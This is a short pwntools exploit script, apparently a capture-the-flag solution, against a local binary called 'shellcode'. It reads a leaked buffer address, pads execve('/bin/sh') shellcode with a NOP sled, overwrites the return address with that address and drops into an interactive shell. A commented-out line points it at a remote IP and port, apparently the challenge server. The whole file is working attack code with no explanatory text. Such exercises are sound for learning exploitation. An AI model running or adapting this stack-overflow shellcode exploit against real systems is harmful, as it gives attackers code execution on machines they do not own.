from pwn import *

elf = ELF("./shellcode")
context.binary = elf

p = elf.process()
#p=connect('34.185.173.244',31469)

shellcode = asm(shellcraft.execve("/bin/sh", 0, 0)) #shellcraft.sh() DOESN'T WORK FFS

p.recvuntil(b"Shellcode detected : ")
buffer_address = int(p.recvline().strip(), 16)

payload  = shellcode.ljust(72, b"\x90") #NOP SLIDE
payload += p64(buffer_address)

# send payload FIRST
p.sendline(payload)


# gdb.attach() DOESN'T WORK DON'T USE !!!!
#gdb.attach(p)

p.interactive()
